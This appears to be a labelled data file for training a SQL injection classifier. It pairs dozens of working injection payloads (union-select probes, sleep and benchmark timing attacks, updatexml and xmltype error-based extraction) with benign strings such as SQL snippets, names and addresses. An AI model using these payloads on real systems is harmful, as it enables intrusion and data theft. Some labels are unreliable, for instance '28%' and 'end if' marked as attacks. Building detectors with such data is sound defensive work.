payload	label
" select * from users where id  =  1 or ""._"" or 1  =  1 -- 1"	1
   SELECT flame, shaking, gulfFROM buried WHERE realize  IS NOT NULL	0
"1%""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""%""  =  """	1
travesia palacio 61, 1?d	0
SELECT * FROM explore WHERE with = 'affect' LIMIT 3	0
" select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1"	1
1'||  (  select 'xwbo' from dual where 1263  =  1263 waitfor delay '0:0:5'  )  ||'	1
patacki	0
1290000000000000	0
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1"	1
1  )   union all select null,null,null,null,null,null#	1
SELECT useful FROM warn	0
SELECT TOP 50 PERCENT * FROM temperature	0
SELECT * FROM local WHERE Price NOT BETWEEN 10 AND 20	0
-3100'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'etuj' like 'etuj	1
SELECT TOP 3 * FROM paint SELECT * FROM prove 3SELECT * FROM certain	0
SELECT * FROM money FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM forest	0
1  )   where 7199  =  7199 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
SELECT slave ( s )  FROM important UNION ALL	0
conciliador	0
ruiloba	0
yarela	0
1'  )   union all select null,null,null,null,null,null,null,null,null--	1
SELECT earn ( s )  FROM circle UNION ALL	0
SELECT * FROM press WHERE break = 'map' FETCH FIRST 3 ROWS ONLY	0
SELECT Count ( * )  AS adult	0
SELECT AVG ( similar ) FROM cutting	0
mozek	0
keely4	0
35231	0
1'  )   where 4003  =  4003	1
1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--	1
broun_granlund@purplemoongrn.fi	0
28%	1
1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   	1
1%'   )    )    union all select null,null,null,null,null--	1
velichcanich pairot	0
SELECT MIN ( parent )  AS doctor FROM therefore	0
SELECT TOP 50 PERCENT * FROM particularly	0
 SELECT column_name ( s )  FROM natural,brother	0
  SELECT thank AS dried, studied AS [refused]  FROM land	0
63482988k	0
SELECT * FROM sitting WHERE north = 'subject' FETCH FIRST 3 ROWS ONLY	0
1%'  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
SELECT * FROM slowly WHERE    NOT stepped = 'able'	0
-5934' union all select 6096,6096,6096,6096,6096#	1
SELECT * FROM nor FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM improve	0
1   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   5776  =  5776	1
navalmoral de bjar	0
fredes damas	0
SELECT AVG ( atom ) FROM entirely SELECT SUM ( worse ) 	0
1  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  2303  =  2303	1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""%""  =  """	1
-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--	1
jardines, 110	0
disney	0
SELECT MIN ( market )  AS powerful FROM cover	0
-1755%' union all select 2615,2615,2615,2615,2615,2615#	1
SELECT AVG ( consist ) FROM getting SELECT SUM ( pen ) 	0
SELECT * FROM  ( SELECT light FROM dried ) 	0
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1'	1
ecija 51 12-h	0
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'eocx'  =  'eocx	1
SELECT TOP 3 * FROM hot	0
SELECT COUNT ( DISTINCT plus )  FROM chest	0
"-6747"" or 9323  =  9323#"	1
SELECT gave ( s )  FROM sad SELECT hardly ( s ) 	0
2er7n9um43a	0
"select sleep  (  5  )   and ""irxg""  =  ""irxg"	1
INSERT INTO locate ( nose, fellow, heard, dance, angle, recall )  VALUES  ( 'period', 'laugh'. collect', 'world', 'including', 'under', 'traffic' )  	0
576780000000000	0
SELECT * FROM up WHERE influence = 'another'	0
1  )   where 8008  =  8008 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT TOP 3 * FROM pull SELECT * FROM discover 3SELECT * FROM canal	0
1'   )    )    as kgfp where 2366  =  2366	1
rusch de celis	0
"1""   )    )    union all select null,null,null,null,null,null,null--"	1
quest@palmatraducciones.pw	0
21	0
38507707a	0
igea	0
18513875w	0
-9564 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) 	1
end if	1
 SELECT column_name ( s )  FROM magnet,cannot	0
4644	0
1'+  (  select 'rryx' where 1228  =  1228 union all select null,null,null,null,null,null,null,null,null#	1
SELECT * FROM spider WHERE    NOT vessels = 'oxygen'	0
"-9142%""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """	1
1%'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and '%'  =  '	1
DELETE FROM agree WHERE burn = 'raise'	0
v5482+ct0	0
2.03996E+015	0
1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'vpqr'  =  'vpqr	1
SELECT AVG ( truth ) FROM electric	0
35200	0
1  )   as zelk where 1944  =  1944 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
1   )    )    as quap where 7625  =  7625	1
6424	0
entendimiento	0
1'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  'gbhd'  =  'gbhd	1
8990910000000000	0
5568780000000000	0
1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
escusaa	0
holbrook	0
"-4934"" union all select 5119,5119,5119,5119,5119--"	1
SELECT * FROM open FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM brass	0
c/ corua, 25, 3h	0
  SELECT FORMAT ( 250500.5634, 2 ) ;	0
